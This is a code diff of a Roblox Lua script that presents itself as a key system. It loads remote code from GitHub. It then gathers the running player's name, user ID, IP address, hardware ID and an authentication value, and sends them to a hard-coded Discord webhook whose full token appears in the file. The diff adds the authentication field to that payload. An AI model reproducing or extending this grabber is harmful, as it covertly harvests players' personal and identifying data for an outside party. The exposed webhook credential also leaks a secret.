@@ -1,5 +1,11 @@
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local clientHWID = RbxAnalyticsService:GetClientId()
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local webhookUrl = "https://discord.com/api/webhooks/1363428306048778312/ePaZU3-PDYO0-u9I2VJFQpGeYYOsn0OVA2soAoiPsDhu1Fs_WZ1_8OlQStVLLvUPpnye"
+local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=1&width=420&height=420"
 
 local success, response = pcall(function()
     return game:HttpGet("https://raw.githubusercontent.com/minute124/OJUNYUYVF/main/KeySystem.lua")
@@ -43,18 +49,14 @@ if not success then
     warn("Failed to load external library: " .. tostring(lib))
 end
 
-local HttpService = game:GetService("HttpService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
 local realData = {
     RobloxNickname = player.Name,
     DiscordNickname = player.DisplayName,
     UserId = player.UserId,
     ProfileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
     IP = GetIP(),
-    HWID = "HWID-" .. (RbxAnalyticsService:GetClientId() or "Unknown")
+    HWID = "HWID-" .. (RbxAnalyticsService:GetClientId() or "Unknown"),
+    auth = result
 }
 
 if _G.GetIP then
@@ -66,9 +68,6 @@ if _G.GetIP then
     end
 end
 
-local webhookUrl = "https://discord.com/api/webhooks/1363428306048778312/ePaZU3-PDYO0-u9I2VJFQpGeYYOsn0OVA2soAoiPsDhu1Fs_WZ1_8OlQStVLLvUPpnye"
-
-local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=1&width=420&height=420"
 local success, response = pcall(function()
     local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png"
     local json = game:HttpGet(apiUrl)
@@ -116,6 +115,11 @@ local embedData = {
                 {
                     ["name"] = "HWID",
                     ["value"] = realData.HWID,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Authentication",
+                    ["value"] = realData.auth,
                     ["inline"] = true
                 }
             },
